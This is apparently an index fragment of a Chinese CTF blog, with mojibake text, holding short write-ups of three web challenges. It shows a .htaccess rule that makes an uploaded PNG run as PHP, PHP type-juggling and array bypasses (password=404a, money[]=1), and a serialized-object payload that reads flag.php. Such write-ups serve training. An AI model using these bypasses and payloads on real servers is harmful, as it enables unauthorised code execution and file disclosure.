ä½ ğŸå‘¢-ä¸Šä¼ æœ¨é©¬-æŠ“åŒ…æ”¹åç¼€-htaccessç»•è¿‡"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢-ä¸Šä¼ æœ¨é©¬-æŠ“åŒ…æ”¹åç¼€-htaccessç»•è¿‡" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢(ä¸Šä¼ æœ¨é©¬+æŠ“åŒ…æ”¹åç¼€+.htaccessç»•è¿‡)"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢(ä¸Šä¼ æœ¨é©¬+æŠ“åŒ…æ”¹åç¼€+.htaccessç»•è¿‡)</h2><p>éšä¾¿ä¸Šä¼ ï¼Œæœ‰é™åˆ¶ å°è¯•äº†php3,php5,ptml,ç©ºæ ¼ç»•è¿‡,éƒ½ä¸è¡Œ</p><p>å…ˆä¸Šæ¬¡1.png   &#x2F;&#x2F;ä¸åé¢çš„pngæ–‡ä»¶åä¸€è‡´</p><p>å°è¯•.htaccess</p><p>å†…å®¹ï¼š<br>&lt;FilesMatch â€œ1.pngâ€&gt;<br>SetHandler application&#x2F;x-httpd-php<br></FilesMatch></p><p>æŠ“åŒ…&#x3D;&#x3D;&gt;Content-Type: image&#x2F;png</p><p>å¤åˆ¶ç½‘å€ï¼š&#x2F;upload&#x2F;731ae4223a74740c27bb86b66c482220&#x2F;<strong>.htaccess</strong></p><p>æ”¹ä¸º&#x2F;upload&#x2F;731ae4223a74740c27bb86b66c482220&#x2F;<strong>1.png</strong></p><p>è¸©å‘ï¼š<em>è¿™é‡Œè¦æŠŠ.htaccessæ”¹ä¸º1.pngï¼Œå› ä¸ºå¯†ç cmdæ˜¯å¯¹åº”çš„1.png</em></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlagï¼ˆæ•°ç»„ç»•è¿‡é•¿åº¦é™åˆ¶ï¼‰"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlagï¼ˆæ•°ç»„ç»•è¿‡é•¿åº¦é™åˆ¶ï¼‰" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlagï¼ˆæ•°ç»„ç»•è¿‡é•¿åº¦é™åˆ¶ï¼‰"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlagï¼ˆæ•°ç»„ç»•è¿‡é•¿åº¦é™åˆ¶ï¼‰</h2><p>If you want to buy the FLAG:<br>                                 You must be a student from CUIT!!!<br>                                 You must be answer the correct password!!!  </p><p>æºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--<br>~~~post money <span class="hljs-keyword">and</span> password~~~<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;<br>&#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$password</span> == <span class="hljs-number">404</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password Right!&lt;/br&gt;&quot;</span>;<br></code></pre></td></tr></table></figure><p>password&#x3D;404a     ç»•è¿‡</p><p>æŸ¥çœ‹HTTP å‘ç°Cookie: user&#x3D;0     0æ”¹ä¸º1è¯•è¯•</p><p>æ˜¾ç¤ºï¼šPay for the flag!!!hacker!!!</p><p>çªç„¶æƒ³èµ·æ¥moneyè¿˜è¦å¤Ÿ</p><p>password&#x3D;404a&amp;money&#x3D;100000000</p><p>æ˜¾ç¤º Nember lenth is too long</p><p>é’±å‡å°‘è¿˜ä¸å¤Ÿ</p><p>å¯ä»¥å°å°9e9  <strong>password&#x3D;404a&amp;money&#x3D;9e9</strong></p><p>è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå¸¸è§çš„æ•°ç»„ç»•è¿‡    <strong>password&#x3D;404a&amp;money[]&#x3D;1</strong></p><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialzï¼ˆååºåˆ—åŒ–ï¼‰"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialzï¼ˆååºåˆ—åŒ–ï¼‰" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialzï¼ˆååºåˆ—åŒ–ï¼‰"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialzï¼ˆååºåˆ—åŒ–ï¼‰</h2><p>æ„é€ POPé“¾</p><p>ä¸ä½¿ç”¨é¢˜ç›®ä¸­åŸæœ‰çš„å„ä¸ªå­—æ®µçš„protectå±æ€§ï¼Œå› ä¸ºè¿™æ ·ä¼šä½¿å¾—åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å‡ºç°ä¸å¯æ‰“å°å­—ç¬¦ï¼Œè€Œé¢˜ç›®ä¸­çš„is_valid()å‡½æ•°åˆä¼šæ£€éªŒè¾“å…¥çš„å­—ç¬¦ä¸²ä¸­æ˜¯å¦æœ‰ä¸å¯æ‰“å°å­—ç¬¦ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬è¿™é‡ŒæŠŠprotectå±æ€§ä¿®æ”¹ä¸ºpublicã€‚</p><?phpclass FileHandler {  public $op=2;  public $filename="./flag.php";  public $content;  }$a=new FileHandler;$str1=serialize($a);echo $str1;?><p>O:11:â€FileHandlerâ€:3:{s:2:â€opâ€;i:2;s:8:â€filenameâ€;s:10:â€.&#x2F;flag.phpâ€;s:7:â€contentâ€;N;}</p><p>payloadï¼š ?str&#x3D;O:11:â€FileHandlerâ€:3:{s:2:â€opâ€;i:2;s:8:â€filenameâ€;s:10:â€.&#x2F;flag.phpâ€;s:7:â€contentâ€;N;}</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
